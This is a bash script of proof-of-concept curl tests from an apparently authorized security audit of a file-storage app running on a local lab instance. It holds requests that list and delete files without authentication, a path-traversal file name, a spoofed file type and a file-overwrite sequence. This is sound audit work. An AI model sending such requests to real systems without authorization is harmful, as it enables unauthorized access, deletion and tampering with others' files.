#!/bin/bash
# ============================================================
# Scripts de prueba - Auditoría ArchivaCloud P-10 (Fase 3)
# Auditor: Joaquín Zambrano Baeza
#
# ADVERTENCIA ÉTICA: estos comandos se ejecutaron ÚNICAMENTE
# sobre una instancia propia desplegada en un entorno de
# laboratorio (AWS Academy), conforme a la Ley 21.459. NO deben
# ejecutarse contra infraestructura ajena.
#
# Requisitos: backend en localhost:8000, frontend en localhost:5173.
# ============================================================

# --- Prueba 1: Ausencia de autenticación (lectura) — VULN-001 ---
# Lista todos los archivos sin ningún token de autenticación.
curl http://localhost:8000/api/files

# --- Prueba 2: Ausencia de autenticación (borrado) — VULN-001 ---
# Elimina un objeto sin credenciales.
curl -X DELETE "http://localhost:8000/api/files/uploads/sample.pdf"

# --- Prueba 3: Path/Key traversal — VULN-002 ---
# El nombre de archivo con ../../ genera una key fuera de uploads/.
curl -X POST "http://localhost:8000/api/upload/presigned-url" \
  -H "Content-Type: application/json" \
  -d '{"fileName":"../../escape/test.pdf","fileType":"application/pdf","fileSize":1000}'

# --- Prueba 4: Tipo de archivo falsificable — VULN-004 ---
# Se declara un .html como application/pdf y el servidor lo acepta.
curl -X POST "http://localhost:8000/api/upload/presigned-url" \
  -H "Content-Type: application/json" \
  -d '{"fileName":"malicioso.html","fileType":"application/pdf","fileSize":1000}'

# --- Prueba 5: Fuga de información en errores — VULN-005 ---
# Una key inválida devuelve el error crudo de boto3 al cliente.
curl -s -X DELETE "http://localhost:8000/api/files/uploads/%00invalid" \
  -w "\nHTTP: %{http_code}\n"

# --- Prueba 6: Sobrescritura de objetos — VULN-003 ---
# Se sube un archivo "víctima" y luego se reemplaza subiendo otro
# con el mismo nombre (contrato.pdf) usando la URL prefirmada.
# (Se solicita la presigned URL y se hace el PUT del contenido nuevo.)
echo "CONTENIDO ORIGINAL DE LA VICTIMA" > victima.pdf
echo "ARCHIVO SOBRESCRITO POR EL ATACANTE" > atacante.pdf
# 1) pedir presigned URL para contrato.pdf y subir victima.pdf
# 2) pedir presigned URL para contrato.pdf y subir atacante.pdf (sobrescribe)
# 3) verificar el contenido final:
aws s3 cp s3://archivacloud-p10-jz/uploads/contrato.pdf -

# --- Prueba 7: CORS desde origen no autorizado (control correcto) ---
# El navegador bloquea la petición; con curl se ve que la API responde
# pero el control CORS actúa en el navegador (ver test_cors.html).
curl -s -i -X GET "http://localhost:8000/api/files" \
  -H "Origin: http://sitio-malicioso.com"
